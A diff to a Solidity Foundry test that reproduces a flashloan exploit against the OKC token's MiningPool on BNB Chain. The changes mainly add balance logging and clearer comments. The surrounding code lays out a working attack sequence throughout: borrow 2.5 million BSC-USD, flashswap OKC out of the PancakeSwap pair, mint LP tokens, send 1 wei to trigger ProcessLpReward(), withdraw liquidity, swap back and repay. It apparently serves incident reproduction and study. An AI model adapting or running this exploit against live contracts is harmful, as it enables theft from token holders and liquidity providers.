@@ -67,7 +67,8 @@ contract OKCProcessLpRewardExploit is Test {
     
 
     uint256 attack_uint256_1 = 2500000000000000000000000; // Amount of BSC-USD to flashloan from PANCAKEV3POOL
-    uint256 attack_uint256_2 = 130000000000000000000000;  // Amount of OKC to SWAP BSD-USD for
+    uint256 attack_uint256_2 = 130000000000000000000000;  // Amount of BSD-USD to swap for OKC
+    //uint256 attack_uint256_2 = 153000000000000000000000;  // Amount of BSD-USD to swap for OKC
 
     function setUp() public {
         // deposit 1 wei to this contract to trigger the ProcessLPReward() function in the MiningPool contract
@@ -233,6 +234,7 @@ contract OKCProcessLpRewardExploit is Test {
       console2.log("Total BSC-USD Flashloaned:", total_position);
 
       address[] memory path = new address[](2);
+      // go from BSC-USD to OKC
       path[0] = BSCUSD;
       path[1] = OKC;
       /*
@@ -245,18 +247,31 @@ contract OKCProcessLpRewardExploit is Test {
       uint[] memory amountOut = IPancakeRouter01(PANCAKEROUTER).getAmountsOut(attack_uint256_2, path);
       console2.log("Amount of OKC to swap for:", amountOut[1]);
 
+      console2.log("My OKC Balance:", IERC20(OKC).balanceOf(address(this)));
+      console2.log("My BSC-USD Balance:", IERC20(BSCUSD).balanceOf(address(this)));
+
       uint256 lpOkcBalance = IERC20(OKC).balanceOf(PANCAKELP);
       console2.log("PANCAKELP OKC Balance:", lpOkcBalance);
+      uint256 lpBscusdBalance = IERC20(BSCUSD).balanceOf(PANCAKELP);
+      console2.log("PANCAKELP BSC-USD Balance:", lpBscusdBalance);
 
-      // function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
       // https://docs.uniswap.org/contracts/v2/concepts/core-concepts/flash-swaps
       // https://docs.uniswap.org/contracts/v2/guides/smart-contract-integration/using-flash-swaps
       // https://docs.uniswap.org/contracts/v2/reference/smart-contracts/pair#swap-1
       // https://www.rareskills.io/post/uniswap-v2-swap-function
-      // flashswap/loan 1 BSC-USD and 386818228002321477291844 OKC from PANCAKELP
-      // this should drain the LP of most of its OKC liquidity
+
+      // flashSwap large amount BSD-USD and OKC from PANCAKELP to this contract
+      // this will call the pancakeCall() function in this contract to provide the amountIn(pay) for the flashloan
       IPancakePair(PANCAKELP).swap(1, amountOut[1], address(this), abi.encode(attack_uint256_2));
-      // uses the swap callback to provide the amountIn for the flashLoan
+      // uses the swap callback to pay the amountIn for the flashswap instead
+
+      uint256 lpOkcBalanceAfter = IERC20(OKC).balanceOf(PANCAKELP);
+      console2.log("PANCAKELP OKC Balance After:", lpOkcBalanceAfter);
+      uint256 lpBscusdBalanceAfter = IERC20(BSCUSD).balanceOf(PANCAKELP);
+      console2.log("PANCAKELP BSC-USD Balance After:", lpBscusdBalanceAfter);
+
+      console2.log("My OKC Balance After:", IERC20(OKC).balanceOf(address(this)));
+      console2.log("My BSC-USD Balance After:", IERC20(BSCUSD).balanceOf(address(this)));
 
       bytes memory createCode = type(ExploitHelper).creationCode;
 
@@ -292,11 +307,12 @@ contract OKCProcessLpRewardExploit is Test {
 
       // get OKC balance of this contract
       uint256 okc_balance = IERC20(OKC).balanceOf(address(this));
-      console2.log("Current OKC Balance: %d", okc_balance);
+      console2.log("My current OKC Balance: %d", okc_balance);
 
-      // rareskills
+      // get a quote of how many LP tokens we can mint if we supply our current okc balance
       uint total = IPancakeRouter01(PANCAKEROUTER).quote(okc_balance, reserve1, reserve0);
-      console2.log("liquidity quote(): %d", total);
+      console2.log("Get liquidity LP quote(): %d", total);
+
       // Transfer BSC-USD to PANCAKELP
       IERC20(BSCUSD).transfer(PANCAKELP, total);
 
@@ -309,10 +325,16 @@ contract OKCProcessLpRewardExploit is Test {
       // transfer PANCAKELP liquidity tokens to exploitHelperTwo
       IPancakePair(PANCAKELP).transfer(exploitHelperTwo, lpTokenAmt);
 
+      console2.log("MinerPool BSC-USD Balance before ProcessLpReward(): %d", IERC20(BSCUSD).balanceOf(MINERPOOL));
+      console2.log("MinerPool OKC Balance before ProcessLpReward(): %d", IERC20(OKC).balanceOf(MINERPOOL));
+
       console2.log("Sending 1WEI to trigger ProcessLpReward() in MiningPool contract.");
       // transfer 1WEI to 0x36016c4f0e0177861e6377f73c380c70138e13ee
       MINERPOOL.call{value: 1 wei}(""); // trigger processLPReward() in the MiningPool contract
-    
+
+      console2.log("MinerPool BSC-USD Balance AFTER ProcessLpReward(): %d", IERC20(BSCUSD).balanceOf(MINERPOOL));
+      console2.log("MinerPool OKC Balance AFTER ProcessLpReward(): %d", IERC20(OKC).balanceOf(MINERPOOL));
+
       // transfer PANCAKELP liquidity tokens to this exploit contract.
       exploitHelperTwo.call(abi.encodeWithSignature("transfer(address,address)", PANCAKELP, address(this)));
 
@@ -330,6 +352,9 @@ contract OKCProcessLpRewardExploit is Test {
         block.timestamp
       );
 
+      console2.log("OKC Balance after removeLiquidity(): %d", IERC20(OKC).balanceOf(address(this)));
+      console2.log("BSC-USD Balance after removeLiquidity(): %d", IERC20(BSCUSD).balanceOf(address(this)));
+
       // Transfer the OKC tokens held by exploitHelperOne to this address
       exploitHelperOne.call(abi.encodeWithSignature("transfer(address,address)", OKC, address(this)));
 
@@ -342,6 +367,7 @@ contract OKCProcessLpRewardExploit is Test {
       // approve pancake router to spend OKC tokens
       IERC20(OKC).approve(PANCAKEROUTER, type(uint256).max);
 
+      // go from OKC to BSC-USD
       path[0] = OKC;
       path[1] = BSCUSD;
 
@@ -353,6 +379,8 @@ contract OKCProcessLpRewardExploit is Test {
         address(this),
         block.timestamp
       );
+      console2.log("OKC Balance after swapExactTokensForTokensSupportingFeeOnTransferTokens(): %d", IERC20(OKC).balanceOf(address(this)));
+      console2.log("BSC-USD Balance after swapExactTokensForTokensSupportingFeeOnTransferTokens(): %d", IERC20(BSCUSD).balanceOf(address(this)));
 
       // Transfer 2500250000000000000000000 BSC-USD tokens to PANCAKEV3POOL paying back the 2.5m flashloan + fee. 
       IERC20(BSCUSD).transfer(PANCAKEV3POOL, 2500250000000000000000000);
